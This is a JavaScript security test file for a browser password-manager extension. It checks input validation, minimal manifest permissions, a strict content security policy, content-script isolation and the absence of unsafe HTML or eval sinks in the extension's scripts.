test("SEC-E26: malformed gesture nonce and oversized/NUL-bearing strings are refused before native access", async () => {
  const h = sw();
  assert.equal((await h.send({ type: "get_browser", gesture_nonce: "Z".repeat(32) })).error, "invalid_gesture_nonce");
  assert.equal((await h.send({ type: "get_browser", entry_id: "a\0b" })).error, "invalid_entry_id");
  assert.equal((await h.send({ type: "get_browser", grant: "g".repeat(129) })).error, "invalid_grant");
  assert.equal((await h.send({ operation_id: "x".repeat(129) })).error, "invalid_request");
  assert.equal(h.calls.length, 0);
});

// ---------------------------------------------------------------- manifests and static checks
const manifest = JSON.parse(fs.readFileSync(path.join(EXT, "manifest.json"), "utf8"));

test("SEC-E27: permission surface - no broad or unnecessary API permissions, no web-page messaging channel", () => {
  assert.deepEqual([...manifest.permissions].sort(), ["activeTab", "favicon", "nativeMessaging", "scripting", "storage", "webNavigation"]);
  for (const p of ["tabs", "cookies", "webRequest", "webRequestBlocking", "debugger", "history", "management", "downloads", "clipboardRead", "<all_urls>"]) {
    assert.ok(!manifest.permissions.includes(p), p);
  }
  assert.deepEqual(manifest.host_permissions, ["http://*/*", "https://*/*"], "documented static host access; no file:// or ftp://");
  assert.equal(manifest.externally_connectable, undefined, "web pages cannot runtime.sendMessage the worker");
  assert.equal(manifest.optional_permissions, undefined);
  const ff = firefoxManifest(manifest);
  assert.ok(!ff.permissions.includes("favicon"));
  assert.ok(ff.permissions.every(p => manifest.permissions.includes(p)), "Firefox build adds no permission");
});

test("SEC-E28: CSP and content-script isolation", () => {
  assert.equal(manifest.content_security_policy.extension_pages, "script-src 'self'; object-src 'self'");
  assert.equal(firefoxManifest(manifest).content_security_policy.extension_pages, "script-src 'self'; object-src 'self'");
  // Exactly one page-world script: the passkey wrapper, which holds no vault
  // secret (only its own channel secret) and gets no extension API (no api.js, no chrome.* in the MAIN world).
  const main = manifest.content_scripts.filter(cs => cs.world === "MAIN");
  assert.equal(main.length, 1);
  assert.deepEqual(main[0].js, ["webauthn-page.js"]);
  for (const cs of manifest.content_scripts) {
    assert.ok(cs.world === "ISOLATED" || cs === main[0]);
    assert.notEqual(cs.match_about_blank, true, "no about:blank / srcdoc frames, where sender.url would not carry the origin");
    assert.notEqual(cs.match_origin_as_fallback, true);
  }
  assert.equal(manifest.sandbox, undefined);
});

test("SEC-E29: web_accessible_resources expose nothing (no script, page or image) to http(s) pages", () => {
  assert.equal(manifest.web_accessible_resources, undefined);
  assert.equal(firefoxManifest(manifest).web_accessible_resources, undefined);
});

test("SEC-E30: extension fingerprinting through web_accessible_resources", () => {
  const war = manifest.web_accessible_resources || [];
  assert.ok(war.every(entry => entry.use_dynamic_url === true) || war.length === 0, "no static, probeable extension URL");
});

test("SEC-E30: in-page icons are inline SVG in the closed shadow root and reference no extension URL", async () => {
  const html = `${LOGIN_FORM}<form action="/2fa" method="post"><input id="otp" autocomplete="one-time-code"></form>
    <form action="/pay" method="post"><input autocomplete="cc-number"></form><form action="/profile" method="post"><input type="email" autocomplete="email"></form>`;
  const p = await loaded({ html });
  const hosts = [...p.fieldIcons(), ...p.otpIcons(), ...p.cardIcons(), ...p.identityIcons()];
  assert.equal(hosts.length, 4);
  for (const host of hosts) {
    const root = p.shadows.get(host);
    assert.equal(root.querySelectorAll("img,image,use,link").length, 0, "no fetched image");
    assert.ok(root.querySelector("button > svg"), "inline SVG glyph");
    assert.ok(!/chrome-extension:|moz-extension:|url\((?!#)/.test(root.innerHTML), "no extension or external URL");
  }
  assert.ok(!/getURL/.test(fs.readFileSync(path.join(EXT, "content.js"), "utf8")));
});

test("SEC-E31: no HTML-sink, eval or page-message channel in any extension script; popup has no inline or remote script", () => {
  const files = fs.readdirSync(EXT).filter(f => f.endsWith(".js"));
  const sinks = [/\.innerHTML\s*=/, /\.outerHTML\s*=/, /insertAdjacentHTML/, /document\.write/, /\beval\s*\(/, /new\s+Function\s*\(/, /setTimeout\(\s*["'`]/,
    /addEventListener\(\s*["']message["']/, /\bonmessage\s*=/, /postMessage\s*\(/, /onMessageExternal/, /onConnectExternal/];
  // No exemption, not even for the passkey wrapper and its bridge: since the
  // 2026-10-18 audit they talk over CustomEvents named after a per-document
  // secret handed over at document_start, never window messages.
  for (const f of files) {
    const src = fs.readFileSync(path.join(EXT, f), "utf8");
    for (const re of sinks) assert.ok(!re.test(src), `${f} matches ${re}`);
  }
  for (const f of ["webauthn-page.js", "webauthn-bridge.js"]) {
    const src = fs.readFileSync(path.join(EXT, f), "utf8");
    assert.match(src, /lgk-passkey-req-\$\{secret\}/, `${f} addresses requests by the secret`);
    assert.match(src, /lgk-passkey-res-\$\{secret\}/, `${f} addresses replies by the secret`);
  }
  const html = fs.readFileSync(path.join(EXT, "popup.html"), "utf8");
  const scripts = [...html.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi)];
  assert.ok(scripts.length > 0);
  for (const [, attrs, body] of scripts) {
    assert.equal(body.trim(), "", "no inline script");
    assert.match(attrs, /src="[a-z-]+\.js"/, "local script only");
  }
  assert.ok(!/\son[a-z]+\s*=/i.test(html), "no inline event handler attributes");
});
